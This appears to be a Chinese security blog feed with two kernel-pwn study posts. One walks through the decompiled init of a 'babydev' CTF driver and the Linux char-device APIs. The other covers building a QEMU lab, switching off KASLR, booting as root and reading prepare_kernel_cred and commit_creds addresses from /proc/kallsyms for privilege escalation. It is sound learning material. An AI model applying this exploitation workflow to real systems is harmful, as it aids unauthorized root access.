class="type">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;babydev&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v1 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (class *)_class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v2;</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = device_create(v2, <span class="number">0LL</span>, babydev_no, <span class="number">0LL</span>, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line">        v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        printk(&amp;unk_351);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="alloc-chrdev-region"><a href="#alloc-chrdev-region" class="headerlink" title="alloc_chrdev_region"></a>alloc_chrdev_region</h4><p>首先出现的是alloc_chrdev_region函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">alloc_chrdev_region</span><span class="params">(<span class="type">dev_t</span> *dev, <span class="type">unsigned</span> baseminor, <span class="type">unsigned</span> count,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">char_device_struct</span> *<span class="title">cd</span>;</span></span><br><span class="line">cd = __register_chrdev_region(<span class="number">0</span>, baseminor, count, name);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(cd))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(cd);</span><br><span class="line">*dev = MKDEV(cd-&gt;major, cd-&gt;baseminor);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>alloc_chrdev_region</code> 是Linux内核中用于动态分配字符设备号的函数。在Linux系统中，字符设备是一种用于与字符设备驱动程序通信的设备类型，例如终端设备、串口设备等。每个字符设备都有一个唯一的设备号，该设备号由主设备号和次设备号组成。</p><p>参数说明：</p><ul><li><code>dev</code>：用于存储分配的设备号范围的变量（包括主设备号和起始的次设备号）。</li><li><code>baseminor</code>：起始的次设备号。</li><li><code>count</code>：要分配的设备号数量。</li><li><code>name</code>：设备名称，用于在<code>/proc/devices</code>中标识设备。</li></ul><p>对应的逆操作函数是<strong>unregister_chrdev_region</strong></p><h4 id="cdev-init"><a href="#cdev-init" class="headerlink" title="cdev_init"></a>cdev_init</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cdev_init</span><span class="params">(<span class="keyword">struct</span> cdev *cdev, <span class="type">const</span> <span class="keyword">struct</span> file_operations *fops)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(cdev, <span class="number">0</span>, <span class="keyword">sizeof</span> *cdev);</span><br><span class="line">INIT_LIST_HEAD(&amp;cdev-&gt;<span class="built_in">list</span>);</span><br><span class="line">kobject_init(&amp;cdev-&gt;kobj, &amp;ktype_cdev_default);</span><br><span class="line">cdev-&gt;ops = fops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cdev_init</code> 函数的作用是初始化字符设备结构体 <code>cdev</code>。在Linux内核编程中，<code>cdev</code> 结构体代表字符设备，并通过该结构体来向内核注册字符设备。</p><p>参数说明：</p><ul><li><code>cdev</code>：要初始化的字符设备结构体。</li><li><code>fops</code>：与该字符设备关联的文件操作结构体，其中包含了指向驱动程序定义的处理函数的指针</li></ul><h4 id="cdev-add"><a href="#cdev-add" class="headerlink" title="cdev_add"></a>cdev_add</h4><p><code>cdev_add</code> 函数是Linux内核中用于向内核注册字符设备的函数。在使用字符设备时，首先需要创建并初始化 <code>struct cdev</code> 结构体，然后通过 <code>cdev_add</code> 将其注册到内核中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cdev_add</span><span class="params">(<span class="keyword">struct</span> cdev *p, <span class="type">dev_t</span> dev, <span class="type">unsigned</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">p-&gt;dev = dev;</span><br><span class="line">p-&gt;count = count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON(dev == WHITEOUT_DEV)) &#123;</span><br><span class="line">error = -EBUSY;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">error = kobj_map(cdev_map, dev, count, <span class="literal">NULL</span>,</span><br><span class="line"> exact_match, exact_lock, p);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">kobject_get(p-&gt;kobj.parent);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err:</span><br><span class="line">kfree_const(p-&gt;kobj.name);</span><br><span class="line">p-&gt;kobj.name = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>p</code>：指向 <code>struct cdev</code> 结构体的指针，表示要注册的字符设备。</li><li><code>dev</code>：字符设备的设备号，包括主设备号和次设备号。</li><li><code>count</code>：设备的数量。通常为1，表示一个设备。</li></ul><p>对应的逆操作函数是<strong>cdev_del</strong></p><h4 id="class-create"><a href="#class-create" class="headerlink" title="_class_create"></a>_class_create</h4><p><code>_class_create</code> 函数是Linux内核中的一个函数，用于创建一个设备类（<code>struct class</code>）,并返回指向 <code>struct class</code> 结构体的指针。设备类是用于组织和管理设备的结构，它提供了一种将相关设备分组的机制，使得用户空间应用程序更容易识别和管理这些设备。</p><p>对应的逆操作函数是<strong>class_destroy</strong></p><h4 id="device-create"><a href="#device-create" class="headerlink" title="device_create"></a>device_create</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> device *<span class="title function_">device_create</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> class *class, <span class="keyword">struct</span> device *parent,</span></span><br><span class="line"><span class="params">     <span class="type">dev_t</span> devt, <span class="type">void</span> *drvdata, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">va_list vargs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line"></span><br><span class="line">va_start(vargs, fmt);</span><br><span class="line">dev = device_create_groups_vargs(class, parent, devt, drvdata, <span class="literal">NULL</span>,</span><br><span class="line">  fmt, vargs);</span><br><span class="line">va_end(vargs);</span><br><span class="line"><span class="keyword">return</span> dev;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(device_create)</span><br></pre></td></tr></table></figure><p><code>device_create</code> 函数是 Linux 内核中用于创建字符设备节点（<u>设备文件</u>）的函数。这个函数通常与 <code>class_create</code> 配合使用，用于将字符设备注册到设备类并在 <code>/dev</code> 目录下创建相应的设备节点。</p><p>参数说明：</p><ul><li><code>class</code>：指向 <code>struct class</code> 结构体的指针，表示设备类。</li><li><code>parent</code>：父设备的指针，可以是 <code>NULL</code>。</li><li><code>devt</code>：设备号，包括主设备号和次设备号。</li><li><code>drvdata</code>：指向要关联到设备的私有数据的指针，通常为 <code>NULL</code>。</li><li><code>fmt</code>：用于创建设备节点的格式字符串。</li><li><code>...</code>：用于填充 <code>fmt</code> 字符串中的占位符。</li></ul><p><code>device_create</code> 的主要作用是创建一个字符设备节点，并将其注册到设备类中。通过这个函数，用户空间应用程序可以访问 <code>/dev</code> 目录下的设备节点，以与驱动程序通信。</p><p>对应的逆操作函数是<strong>device_destroy</strong></p><hr><p>看一下两个关键的结构体</p><p><strong>file_operations</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="type">ssize_t</span> (*read_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line"><span class="type">ssize_t</span> (*write_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line"><span class="type">int</span> (*iopoll)(<span class="keyword">struct</span> kiocb *kiocb, <span class="keyword">struct</span> io_comp_batch *,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags);</span><br><span class="line"><span class="type">int</span> (*iterate_shared) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line"><span class="type">__poll_t</span> (*poll) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *);</span><br><span class="line"><span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> mmap_supported_flags;</span><br><span class="line"><span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line"><span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line"><span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line"><span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line"><span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line"><span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line"><span class="type">void</span> (*splice_eof)(<span class="keyword">struct</span> file *file);</span><br><span class="line"><span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock **, <span class="type">void</span> **);</span><br><span class="line"><span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">  <span class="type">loff_t</span> len);</span><br><span class="line"><span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line"><span class="type">unsigned</span> (*mmap_capabilities)(<span class="keyword">struct</span> file *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">ssize_t</span> (*copy_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *,</span><br><span class="line"><span class="type">loff_t</span>, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line"><span class="type">loff_t</span> (*remap_file_range)(<span class="keyword">struct</span> file *file_in, <span class="type">loff_t</span> pos_in,</span><br><span class="line">   <span class="keyword">struct</span> file *file_out, <span class="type">loff_t</span> pos_out,</span><br><span class="line">   <span class="type">loff_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> remap_flags);</span><br><span class="line"><span class="type">int</span> (*fadvise)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> (*uring_cmd)(<span class="keyword">struct</span> io_uring_cmd *ioucmd, <span class="type">unsigned</span> <span class="type">int</span> issue_flags);</span><br><span class="line"><span class="type">int</span> (*uring_cmd_iopoll)(<span class="keyword">struct</span> io_uring_cmd *, <span class="keyword">struct</span> io_comp_batch *,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> poll_flags);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>有点像proc_operations的plus版</p><p><strong>cdev</strong></p><p><code>cdev</code> 结构体是 Linux 内核中用于表示字符设备的结构体。它包含了字符设备的一些重要信息和操作函数，用于向内核注册和管理字符设备。下面是 <code>cdev</code> 结构体的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"><span class="type">dev_t</span> dev;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p><code>cdev</code> 结构体的主要成员包括：</p><ol><li><strong><code>struct kobject kobj</code>：</strong> 用于实现内核对象，与 sysfs 文件系统相关，提供一种在用户空间访问设备信息的机制。</li><li><strong><code>struct module *owner</code>：</strong> 拥有该字符设备的内核模块。</li><li><strong><code>const struct file_operations *ops</code>：</strong> 与字符设备关联的文件操作结构体，包含了指向设备的操作函数指针，如 <code>open</code>、<code>read</code>、<code>write</code>、<code>release</code> 等。</li><li><strong><code>struct list_head list</code>：</strong> 用于将 <code>cdev</code> 结构体链接到其他设备结构体的链表。</li><li><strong><code>dev_t dev</code>：</strong> 字符设备的设备号，包括主设备号和次设备号。</li><li><strong><code>unsigned int count</code>：</strong> 设备号的数量，通常为 1。</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>内核pwn其实与用户态pwn并无太大的差异</p><p>就是通过编译执行二进制程序触发加载在内核中的模块存在的漏洞</p><p>想办法完成提权,然后再返回到用户态下getshell</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel学习笔记</title>
      <link href="/posts/6527/"/>
      <url>/posts/6527/</url>
      
        <content type="html"><![CDATA[<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="kernel编译"><a href="#kernel编译" class="headerlink" title="kernel编译"></a>kernel编译</h2><p>从官方或者其它镜像源下载源代码并解压进入目录</p><p>进入内核编译设置</p><p><code>make menuconfig</code></p><p>进入 kernel hacking 子目录,检查一下 debug 相关的选项有没有打开,默认打开,确认一下即可</p><p>开始编译</p><p><code>make bzImage -j$(nproc)</code></p><p>在编译成功后，一般主要关注于如下的文件</p><ul><li>bzImage：<code>arch/x86/boot/bzImage</code></li><li>vmlinux：源码所在的根目录下。</li></ul><p>此外，这里给出常见内核文件的介绍。</p><ul><li><strong>bzImage</strong>：目前主流的 kernel 镜像格式，即 big zImage（即 bz 不是指 bzip2），适用于较大的（大于 512 KB） Kernel。这个镜像会被加载到内存的高地址，高于 1MB。bzImage 是用 gzip 压缩的，文件的开头部分有 gzip 解压缩的代码，所以我们不能用 gunzip 来解压缩。</li><li><strong>zImage</strong>：比较老的 kernel 镜像格式，适用于较小的（不大于 512KB） Kernel。启动时，这个镜像会被加载到内存的低地址，即内存的前 640 KB。zImage 也不能用 gunzip 来解压缩。</li><li><strong>vmlinuz</strong>：vmlinuz 不仅包含了压缩后的 vmlinux，还包含了 gzip 解压缩的代码。实际上就是 zImage 或者 bzImage 文件。该文件是 bootable 的。 bootable 是指它能够把内核加载到内存中。对于 Linux 系统而言，该文件位于 /boot 目录下。该目录包含了启动系统时所需要的文件。</li><li><strong>vmlinux</strong>：静态链接的 Linux kernel，以可执行文件的形式存在，尚未经过压缩,因此存在更多的调试符号信息。该文件往往是在生成 vmlinuz 的过程中产生的。该文件适合于调试。但是该文件不是 bootable 的。</li><li><strong>vmlinux.bin</strong>：也是静态链接的 Linux kernel，只是以一个可启动的 (bootable) 二进制文件存在。所有的符号信息和重定位信息都被删除了。生成命令为：<code>objcopy -O binary vmlinux vmlinux.bin</code>。</li><li><strong>uImage</strong>：uImage 是 U-boot 专用的镜像文件，它是在 zImage 之前加上了一个长度为 0x40 的 tag 而构成的。这个 tag 说明了这个镜像文件的类型、加载位置、生成时间、大小等信息。</li></ul><h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><p>下载busybox源文件解压并进入目录</p><p>编译设置</p><p><code>make menuconfig</code></p><ol><li>在 Setttings 选中 Build static binary (no shared libs)将 busybox 编译为静态链接的文件；</li><li>在 Linux System Utilities 中取消选中 Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)；</li><li>在 Networking Utilities 中取消选中 inetd。</li></ol><p>编译并安装</p><p><code>make -j**$(**nproc)</code></p><p><code>make install</code></p><p>默认是安装在当前目录下的 _install 文件夹中</p><p>创建必要的目录</p><p><code>mkdir -p  proc sys dev etc/init.d</code></p><p>创建init并添加内容</p><p><code>touch init</code></p><p><code>chmod +x init</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br></pre></td></tr></table></figure><p>在_install目录下打包文件系统</p><p><code>find . | cpio -o --format=newc &gt; ../rootfs.cpio</code></p><h2 id="启动内核"><a href="#启动内核" class="headerlink" title="启动内核"></a>启动内核</h2><p>创建boot.sh脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot; \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure><p>在用 qemu 启动内核时，常用的选项如下</p><ul><li>-m， 指定 RAM 大小，默认 384M</li><li>-kernel，指定内核镜像文件 bzImage 路径</li><li>-initrd，设置内核启动的内存文件系统</li><li><code>-smp [cpus=]n[,cores=cores][,threads=threads][,dies=dies][,sockets=sockets][,maxcpus=maxcpus]</code>，指定使用到的核数。</li><li>-cpu，指定指定要模拟的处理器架构，可以同时开启一些保护，如<ul><li>+smap，开启 smap 保护</li><li>+smep，开启 smep 保护</li></ul></li><li>-nographic，表示不需要图形界面</li><li>-monitor，对 qemu 提供的控制台进行重定向，如果没有设置的话，可以直接进入控制台。</li><li>-append，附加选项<ul><li><code>nokaslr</code> 关闭随机偏移</li><li>console=ttyS0，和 <code>nographic</code> 一起使用，启动的界面就变成了当前终端。</li></ul></li></ul><h2 id="编译并加载驱动"><a href="#编译并加载驱动" class="headerlink" title="编译并加载驱动"></a>编译并加载驱动</h2><p>根据Makefile编译出ko文件</p><p>将其放置在_install目录下</p><p>修改init</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">insmod /ko_test.ko</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure><p>并重新打包文件系统</p><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><h3 id="root启动"><a href="#root启动" class="headerlink" title="root启动"></a>root启动</h3><p>修改 init 脚本中对应的代码,可以使用 root 用户启动 shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">+ setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure><h3 id="关闭内核随机化"><a href="#关闭内核随机化" class="headerlink" title="关闭内核随机化"></a>关闭内核随机化</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot; \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p><strong>获取内核特定符号地址</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep prepare_kernel_cred  /proc/kallsyms</span><br><span class="line">grep commit_creds  /proc/kallsyms</span><br></pre></td></tr></table></figure><p><strong>查看装载的驱动</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsmod</span><br></pre></td></tr></table></figure><p><strong>获取驱动加载的基地址</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">method 1</span></span><br><span class="line">grep target_module_name /proc/modules </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">method 2</span></span><br><span class="line">cat /sys/module/target_module_name/sections/.text </span><br></pre></td></tr></table></figure><p>/sys/module/ 目录下存放着加载的各个模块的信息。</p><h3 id="启动调试"><a href="#启动调试" class="headerlink" title="启动调试"></a>启动调试</h3><p>qemu提供了调试内核的接口,在启动参数中添加 <code>-gdb dev</code> 